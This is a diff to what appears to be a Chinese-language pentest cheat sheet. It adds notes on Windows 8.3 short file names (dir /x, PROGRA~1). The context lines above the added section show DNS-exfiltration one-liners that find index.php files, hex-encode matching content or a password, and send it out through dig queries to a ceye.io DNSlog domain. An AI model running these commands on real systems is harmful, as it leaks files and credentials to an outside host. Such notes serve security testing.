@@ -953,6 +953,29 @@ pingpwd|base64|tr -d ‘=’.is1lv6.ceye.io
 var=11111 && for b in $(find / -name "index.php" | xargs grep "111222"|xxd -p); do var=$((var+1)) && dig $var.$b.is1lv6.ceye.io; done
 ```
 
+## windows短文件名
+短文件名查看
+```
+用"dir /x"命令可以方便地帮助您查看系统对目录或文件名的缩写
+```
+常见短文件名
+```
+
+Documents and Settings
+可表示为
+DOCUME~1
+又如：
+Local Settings
+可表示为
+LOCALS~1
+
+Program Files
+Program Files (x86)
+这两个目录分别表示为：
+PROGRA~1
+PROGRA~2
+```
+
 
 
 
